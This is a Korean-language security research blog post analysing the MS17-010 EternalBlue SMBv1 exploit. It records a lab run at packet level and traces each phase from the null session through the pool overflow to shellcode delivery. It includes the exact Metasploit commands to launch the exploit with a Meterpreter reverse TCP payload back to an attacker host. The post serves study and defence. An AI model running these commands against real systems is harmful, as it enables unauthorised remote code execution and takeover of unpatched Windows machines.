---
title: "MS17-010 (EternalBlue): SMBv1 익스플로잇 분석"
date: 2017-03-14
description: "MS17-010 EternalBlue 분석 — WannaCry와 NotPetya에 사용된 SMBv1 버퍼 오버플로우 익스플로잇과 Metasploit 모듈 패킷 분석"
tags: ["MS17-010", "EternalBlue", "SMB", "Windows", "exploit", "Metasploit", "WannaCry"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 개요

MS17-010(EternalBlue)은 Windows SMBv1 프로토콜의 심각한 원격 코드 실행 취약점이다. NSA의 EternalBlue 익스플로잇에서 무기화되었으며, 이후 Shadow Brokers에 의해 유출되어 WannaCry와 NotPetya 랜섬웨어 캠페인의 전파 엔진이 되었다.

이 포스트는 Metasploit의 `exploit/windows/smb/ms17_010_eternalblue` 모듈을 취약한 Windows 대상에 실행하면서 캡처한 패킷 수준의 분석을 기록한다.

---

## 취약점 배경

SMB(Server Message Block)는 Windows 파일 공유 프로토콜이다. 클라이언트가 서버의 `MaxBufferSize`(65,512바이트)를 초과하는 `Trans` 요청을 보내면, 나머지 데이터는 후속 `Trans2` 요청으로 전송된다. 취약점은 이 보조 `Trans2` 패킷 처리 과정에서 트리거된다.

Windows에서 네트워크를 통한 디렉터리 공유가 활성화되면 익스플로잇의 첫 번째 전제조건이 자동으로 충족된다. IPC$ 공유가 노출되고 Trans/Trans2 경로에 비인증 상태로 접근이 가능해진다.

**영향받는 시스템**: Windows Vista, 7, 8.1, 10, Server 2003~2016 (미패치)  
**패치**: [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) (2017년 3월 14일)

---

## 환경 구성

- **공격자**: Kali Linux + Metasploit Framework
- **대상**: Windows 7 x64, SMBv1 활성화, 네트워크 디렉터리 공유 활성화, 암호 보호 공유 비활성화

> 이 실습 환경에서 익스플로잇 전제조건(인증된 SMB 세션)을 우회하기 위해 암호 보호 공유를 비활성화해야 했다.

---

## Metasploit 모듈

Metasploit에서 검색하면 두 개의 관련 모듈이 나온다:

```
msf > search ms17-010

   Name                                      Rank
   ----                                      ----
   auxiliary/scanner/smb/smb_ms17_010       normal   (취약점 스캐너)
   exploit/windows/smb/ms17_010_eternalblue  average  (EternalBlue 익스플로잇)
```

스캐너를 대상에 실행하면 취약점이 확인된다:

```
[+] 192.168.x.x:445 - Host is likely VULNERABLE to MS17-010!
```

익스플로잇 설정:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <victim_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

---

## 패킷 분석

익스플로잇 트래픽을 Wireshark로 캡처했다(UDP 필터링). 전체 교환은 다섯 가지 단계로 나뉜다.

### Phase 1 — TCP 3-Way Handshake

포트 445로의 표준 TCP SYN / SYN-ACK / ACK. 흥미롭게도, 연결을 확립하는 최종 ACK 이전의 핸드셰이크 윈도우 안에서 SMB 요청/응답 교환이 발생한다. 이는 Windows SMB 스택이 연결 설정 중 사전 협상을 하는 방식의 산물로 보인다.

### Phase 2 — SMB Negotiation

TCP 핸드셰이크 이후, 클라이언트는 지원하는 SMB 다이얼렉트 목록을 포함한 `SMB_COM_NEGOTIATE` 요청을 보낸다. 서버는 선택한 다이얼렉트와 익스플로잇이 나중에 악용하는 `MaxBufferSize` 필드를 포함한 기능들을 응답으로 보낸다.

### Phase 3 — Session Setup (NTLM 인증)

클라이언트와 서버는 SMB `Session Setup AndX` 패킷에 내장된 NTLM 인증 교환을 수행한다.

NTLM은 Challenge-Response 메커니즘을 사용한다:

1. 클라이언트가 `NTLMSSP_NEGOTIATE`를 전송
2. 서버가 `NTLMSSP_CHALLENGE`(Salt로 사용되는 랜덤 nonce)로 응답
3. 클라이언트가 패스워드 해시와 Challenge를 사용하여 응답을 계산하고 `NTLMSSP_AUTH` 전송

EternalBlue 익스플로잇에서 이 인증 단계는 취약한 Trans 코드 경로에 도달하기 위해 null 세션(익명 로그온)을 사용한다.

### Phase 4 — Tree Connect와 Trans 오버플로우

인증 이후, 클라이언트는 UNC 경로를 제공하여 IPC$ 공유에 연결하는 `Tree Connect AndX`를 발행한다. 서버는 서비스 이름(`IPC`)으로 응답한다.

그 다음 익스플로잇은 30,336바이트의 대용량 `NT Trans` 요청을 전송하는데, 이는 의도적으로 `MaxBufferSize`를 초과한다. 커널 SMB 핸들러인 `srv.sys`는 초기 Trans 헤더의 크기 필드를 기반으로 버퍼를 할당한 후 보조 Trans2 연속 요청을 처리한다. 취약점은 이 보조 처리 경로의 풀 버퍼 오버플로우다: Trans 헤더의 `TotalDataCount` 필드가 할당 크기를 제어하는 반면, 실제로 쓰이는 데이터는 이를 초과할 수 있다.

### Phase 5 — SMB Echo 프로빙

초기 오버플로우 이후, 익스플로잇은 페이로드 `0x41414141...`을 포함한 일련의 `SMB Echo` 요청을 전송한다. 이 프로빙 단계는:

1. 오버플로우가 올바른 풀 영역을 오염시켰는지 탐지
2. Echo 응답에서 OS 버전 정보 수신(올바른 쉘코드 오프셋 선택에 사용)

![0x41 패턴의 SMB Echo 프로브](/images/blog/ms17-010-analysis/Image.png)

### Phase 6 — 두 번째 Negotiate + 쉘코드 전달

두 번째 `SMB Negotiate` 교환이 시작된다. 서버의 응답에서 OS 빌드 정보가 누출되며, 모듈은 이를 사용하여 커널 풀 스프레이 대상을 찾는다.

두 번째 `NT Trans2` 패킷에 실제 쉘코드 페이로드가 포함된다.

### Phase 7 — 포트 445에 TCP RST 플러드

포트 445로의 `TCP [RST, ACK]` 패킷 폭발이 이어진다. 이것은 커널 풀을 정리(grooming)하는 익스플로잇의 메커니즘이다. RST 스톰이 풀 청크를 해제하고 재할당하여 덮어쓰기를 트리거하기 전에 쉘코드를 예측 가능한 주소에 배치한다.

### Phase 8 — Push / 쉘

클라이언트가 `TCP PSH` 패킷을 전송한다. 페이로드를 검사하면 `cmd.exe`를 생성하는 Windows 쉘코드 스텁이 보인다. 직후 연결이 `BROWSER` 상태(NetBIOS Browser 서비스)로 전환되는데, 이는 역방향 쉘이 수립되어 공격자 머신이 명령을 내리고 있음을 나타낸다.

---

## 익스플로잇 흐름 요약

```
TCP 핸드셰이크 (포트 445)
    ↓
SMB Negotiate (다이얼렉트 선택)
    ↓
Session Setup + NTLM (null 세션)
    ↓
Tree Connect → IPC$
    ↓
NT Trans (30336 바이트) → MaxBufferSize 오버플로우 → srv.sys 풀 오염
    ↓
SMB Echo 프로브 (0x41 * N) → 응답으로 OS 핑거프린팅
    ↓
두 번째 SMB Negotiate → 빌드/버전 누출
    ↓
NT Trans2 → 쉘코드 전달
    ↓
TCP RST 플러드 → 커널 풀 그루밍
    ↓
TCP PSH → 쉘코드 트리거 → cmd.exe / Meterpreter
    ↓
BROWSER 상태 → RCE 수립
```

---

## 핵심 기술 포인트

| 항목 | 내용 |
|---|---|
| 프로토콜 | TCP 포트 445의 SMBv1 |
| 오버플로우 위치 | `srv.sys` 커널 풀 (NT Trans / Trans2 핸들러) |
| MaxBufferSize 임계값 | 65,512 바이트 |
| 오버플로우 트리거 | `TotalDataCount` / 보조 Trans2 크기 불일치 |
| 풀 그루밍 | 포트 445에 TCP RST 플러드 |
| 인증 필요 여부 | 없음 (IPC$를 통한 null 세션) |
| 페이로드 | 위치 독립적 쉘코드 → Meterpreter |

---

## 참고

1. [Microsoft Windows - Unauthenticated SMB Remote Code Execution Scanner (MS17-010) — Exploit-DB](https://www.exploit-db.com/exploits/41891/)
2. [FireEye — SMB Exploited: WannaCry Use of EternalBlue](https://www.fireeye.kr/company/press-releases/2017/smb-exploited-wannacry-use-of-eternalblue.html)
3. [WannaCry Ransomware Global Spread — NpCore](http://www.npcore.com/notice/?uid=177&mod=document#top)
4. [SMB, 너로 정했다! PART 01 — BPsec Blog](https://bpsecblog.wordpress.com/2017/07/07/kimchicon_smb_part01/)
5. [WannaCry 기업 피해 — Boannews](http://www.boannews.com/media/view.asp?idx=54731&page=2&kind=1&search=title&find=wannacry)
6. [SMB 프로토콜 개요](http://oulth.tistory.com/58)
7. [SMB (Server Message Block) — Coffeenix](http://coffeenix.net/doc/network/SMB_ICMP_UDP(huichang).pdf)
